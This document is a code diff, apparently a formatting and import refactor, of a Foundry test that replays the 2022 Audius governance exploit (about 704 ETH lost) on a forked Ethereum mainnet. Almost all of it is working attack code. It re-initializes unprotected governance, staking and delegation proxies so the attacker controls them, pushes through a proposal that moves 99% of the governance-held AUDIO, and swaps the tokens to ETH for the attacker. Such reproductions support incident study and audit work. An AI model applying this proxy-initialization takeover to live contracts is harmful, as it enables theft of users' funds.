@@ -2,7 +2,10 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 
 // @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)
 // Attacker : 0xa0c7bd318d69424603cbf91e9969870f21b8ab4c
@@ -30,16 +33,16 @@ import "./../interface.sol";
 // CertiK Alert : https://twitter.com/CertiKAlert/status/1551020421532770305
 // MistTrack : https://twitter.com/MistTrack_io/status/1551204726661734400
 
-CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 address constant attacker = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;
 address constant AUDIO = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
-address payable constant uniswap = payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+address payable constant uniswap = payable(
+    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+);
 address constant governance = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
 address constant staking = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
 address constant delegatemanager = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
 
 interface IGovernence {
-
     enum Vote {
         None,
         No,
@@ -65,7 +68,9 @@ interface IGovernence {
         uint16 _maxInProgressProposals,
         address _guardianAddress
     ) external;
-    function evaluateProposalOutcome(uint256 _proposalId) external returns (Outcome);
+    function evaluateProposalOutcome(
+        uint256 _proposalId
+    ) external returns (Outcome);
     function submitProposal(
         bytes32 _targetContractRegistryKey,
         uint256 _callValue,
@@ -75,44 +80,48 @@ interface IGovernence {
         string calldata _description
     ) external returns (uint256);
     function submitVote(uint256 _proposalId, Vote _vote) external;
-
 }
 
 interface IStaking {
-
-    function initialize(address _tokenAddress, address _governanceAddress) external;
-
+    function initialize(
+        address _tokenAddress,
+        address _governanceAddress
+    ) external;
 }
 
 interface IDelegateManagerV2 {
-
     function initialize(
         address _tokenAddress,
         address _governanceAddress,
         uint256 _undelegateLockupDuration
     ) external;
     function setServiceProviderFactoryAddress(address _spFactory) external;
-    function delegateStake(address _targetSP, uint256 _amount) external returns (uint256);
-
+    function delegateStake(
+        address _targetSP,
+        uint256 _amount
+    ) external returns (uint256);
 }
 
 /* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */
 contract AttackContract is Test {
-
     address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15_201_793); // Fork mainnet at block 15201793
-        cheat.label(AUDIO, "AUDIO");
-        cheat.label(uniswap, "UniswapV2Router02");
-        cheat.label(governance, "GovernanceProxy");
-        cheat.label(staking, "Stacking");
-        cheat.label(delegatemanager, "DelegateManagerV2");
+        vm.createSelectFork("mainnet", 15_201_793); // Fork mainnet at block 15201793
+        vm.label(AUDIO, "AUDIO");
+        vm.label(uniswap, "UniswapV2Router02");
+        vm.label(governance, "GovernanceProxy");
+        vm.label(staking, "Stacking");
+        vm.label(delegatemanager, "DelegateManagerV2");
     }
 
     function testExploit() public {
         console.log("---------- Start from Block %s ----------", block.number);
-        emit log_named_decimal_uint("Attacker ETH Balance", attacker.balance, 18);
+        emit log_named_decimal_uint(
+            "Attacker ETH Balance",
+            attacker.balance,
+            18
+        );
 
         console.log("-------------------- Tx1 --------------------");
         console.log("Modify configurations...");
@@ -127,13 +136,20 @@ contract AttackContract is Test {
         // uint16 _maxInProgressProposals,
         // address _guardianAddress
         // )
-        IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));
+        IGovernence(governance).initialize(
+            address(this),
+            3,
+            0,
+            1,
+            4,
+            address(this)
+        );
 
         console.log("Evaluate Proposal..."); // this is to make sure one can submit new proposals
         IGovernence(governance).evaluateProposalOutcome(84); // callback this.getContract()
 
         uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);
-        uint256 stealAmount = audioBalance_gov * 99 / 1e2; // Steal 99% of AUDIO Token from governance address
+        uint256 stealAmount = (audioBalance_gov * 99) / 1e2; // Steal 99% of AUDIO Token from governance address
 
         console.log("Submit Proposal...");
         // function submitProposal(
@@ -154,21 +170,31 @@ contract AttackContract is Test {
         );
 
         IStaking(staking).initialize(address(this), address(this));
-        IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
-        IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));
+        IDelegateManagerV2(delegatemanager).initialize(
+            address(this),
+            address(this),
+            1
+        );
+        IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(
+            address(this)
+        );
         IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);
 
         console.log("-------------------- Tx2 --------------------");
         console.log("SubmitVote `Yes` for malicious ProposalId 85...");
-        cheat.roll(15_201_795);
+        vm.roll(15_201_795);
         IGovernence(governance).submitVote(85, IGovernence.Vote(2)); // Voting Yes
 
         console.log("-------------------- Tx3 --------------------");
         console.log("Execute malicious ProposalId 85...");
-        cheat.roll(15_201_798);
+        vm.roll(15_201_798);
         IGovernence(governance).evaluateProposalOutcome(85); // callback this.getContract()
         uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));
-        emit log_named_decimal_uint("AttackContract AUDIO Balance", audioBalance_this, 18);
+        emit log_named_decimal_uint(
+            "AttackContract AUDIO Balance",
+            audioBalance_this,
+            18
+        );
 
         console.log("-------------------- Tx4 --------------------");
         console.log("AUDIO/ETH Swap...");
@@ -176,35 +202,50 @@ contract AttackContract is Test {
         path[0] = AUDIO;
         path[1] = weth;
         IERC20(AUDIO).approve(uniswap, 1e40);
-        IUniswapV2Router(uniswap).swapExactTokensForETH(audioBalance_this, 680 ether, path, attacker, block.timestamp);
+        IUniswapV2Router(uniswap).swapExactTokensForETH(
+            audioBalance_this,
+            680 ether,
+            path,
+            attacker,
+            block.timestamp
+        );
 
         console.log("-------------------- End --------------------");
-        emit log_named_decimal_uint("Attacker ETH Balance", attacker.balance, 18);
+        emit log_named_decimal_uint(
+            "Attacker ETH Balance",
+            attacker.balance,
+            18
+        );
     }
 
     /* Tx1 callback functions */
-    function getContract(bytes32 _targetContractRegistryKey) external returns (address) {
+    function getContract(
+        bytes32 _targetContractRegistryKey
+    ) external pure returns (address) {
         return AUDIO;
     }
 
-    function isGovernanceAddress() external view returns (bool) {
+    function isGovernanceAddress() external pure returns (bool) {
         return true;
     }
 
-    function getExecutionDelay() external view returns (uint256) {
+    function getExecutionDelay() external pure returns (uint256) {
         return 0;
     }
 
-    function getVotingPeriod() external view returns (uint256) {
+    function getVotingPeriod() external pure returns (uint256) {
         return 0;
     }
 
-    function transferFrom(address, address, uint256) external pure returns (bool) {
+    function transferFrom(
+        address,
+        address,
+        uint256
+    ) external pure returns (bool) {
         return true;
     }
 
     function validateAccountStakeBalance(address) external pure {}
 
     receive() external payable {}
-
 }
